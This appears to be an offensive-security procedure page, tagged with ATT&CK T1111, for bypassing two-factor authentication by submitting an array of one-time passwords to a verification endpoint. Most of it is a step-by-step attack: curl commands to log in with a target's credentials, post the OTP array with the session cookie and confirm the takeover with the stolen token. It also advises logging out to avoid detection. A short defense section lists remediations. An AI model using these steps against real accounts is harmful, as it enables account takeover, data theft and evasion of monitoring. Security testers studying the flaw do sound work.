---
type: procedure
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Two-Factor Authentication Interception|T1111 - Two-Factor
    Authentication Interception]]
sub_techniques: []
tags:
  - '[[tags/2FA Bypasses]]'
  - '[[tags/Account Takeover]]'
  - '[[tags/Bypass 2FA with array]]'
commands:
  - '[[commands/curl-post-otp-array-verification]]'
platforms:
  - Web
tools: []
verified: true
validated: true
---

# Bypass-2FA-with-OTP-Array

## Summary

This procedure exploits a misconfiguration in 2FA verification endpoints that accept an array of one-time passwords (OTPs) in a single JSON payload. By including a valid OTP among invalid guesses, an attacker can bypass 2FA protections, such as rate limiting designed for single submissions, to gain unauthorized access to an account.

## Description

Some web applications implement 2FA where the verification API endpoint processes a JSON object containing an array of OTP values, checking each until a valid one is found. This allows attackers who have obtained potential OTPs through phishing, social engineering, or brute-force prediction to submit multiple attempts in one request. The technique is effective against time-based OTPs (TOTP) if the valid code is included before it expires. It targets credential access scenarios, enabling account takeover for data theft or further lateral movement. This procedure assumes the attacker has valid primary credentials (username/password) to reach the 2FA stage.

## Requirements

1. Valid username and password for the target account to initiate login and trigger 2FA.
2. A list of potential OTPs, obtained via phishing, app compromise, or common pattern guessing (e.g., 1111, 1234, or predicted TOTP values).
3. Network access to the target's 2FA verification endpoint (e.g., HTTPS POST to /api/verify-otp).
4. Session cookie or token from the initial login attempt to maintain state.
5. Tools like curl for sending HTTP requests or a proxy like Burp Suite for interception and modification.

## Defense

- Modify 2FA endpoints to accept and validate only single OTP values, rejecting arrays to prevent bulk submissions.
- Implement strict rate limiting and anomaly detection on OTP verification requests, flagging payloads with multiple values.
- Use short-lived OTP windows (e.g., 30 seconds) and require CAPTCHA or additional proofs for repeated failures.
- Monitor application logs for unusual request patterns, such as JSON arrays in OTP fields, and educate users on securing OTP generation devices.

## Objectives

1. Submit a crafted OTP array to bypass 2FA verification and complete account login.
2. Achieve unauthorized access to the protected account for sensitive data exfiltration or malicious actions.
3. Demonstrate the vulnerability in multi-OTP tolerant implementations to inform remediation.

## Instructions

### Step 1: Initiate Login and Capture Session

**Context**: Log in with the target's primary credentials to reach the 2FA challenge, capturing the session token needed for the verification request. This step ensures the request is authenticated and stateful.

Use a browser or proxy to perform the initial login. If using curl, send a POST to the login endpoint:

```bash
curl -X POST -H "Content-Type: application/json" -d '{"username":"$_TARGET_USERNAME","password":"$_TARGET_PASSWORD"}' $_LOGIN_URL
```

**Expected Output**: A response with a session cookie (e.g., Set-Cookie: session=abc123) and a redirect or challenge indicating 2FA is required.

### Step 2: Prepare OTP Array Payload

**Context**: Construct a JSON payload with an array of OTPs, including invalid fillers and at least one valid or likely valid code. This exploits the endpoint's array-processing logic without triggering per-OTP rate limits.

Reference the payload code [[codes/JSON-OTP-Array-Payload]] and substitute your list of OTPs. Save it to a file (e.g., otp_payload.json) for use in the next step.

**Expected Output**: A valid JSON object ready for submission, e.g., {"otp": ["1234", "1111", "1337"] } where "1337" is the valid OTP.

### Step 3: Submit OTP Array for Verification

**Context**: Send the POST request with the OTP array to the 2FA endpoint, including the session token from Step 1. The server will validate against the array, succeeding if any OTP matches.

**Command** ([[commands/curl-post-otp-array-verification]]):

Execute the command with placeholders replaced:

```bash
curl -X POST -H "Content-Type: application/json" -H "Cookie: session=$_SESSION_TOKEN" -d @otp_payload.json $_VERIFY_URL
```

> This sends the array payload to the verification endpoint. If successful, the server processes the array and authenticates with the matching OTP.

**Expected Output**: A JSON response indicating successful authentication, such as {"status": "success", "token": "jwt_access_token"} or a redirect to the dashboard.

### Step 4: Verify Access and Clean Up

**Context**: Confirm account access by accessing a protected resource, then log out to avoid detection.

Use the returned access token to query account details:

```bash
curl -H "Authorization: Bearer $_ACCESS_TOKEN" $_PROFILE_URL
```

**Expected Output**: Account details confirming takeover, e.g., {"user": "target@example.com", "role": "admin"}.

**Success Indicators**:
- No 2FA failure response; instead, successful login or token issuance.
- Access to restricted areas without additional prompts.
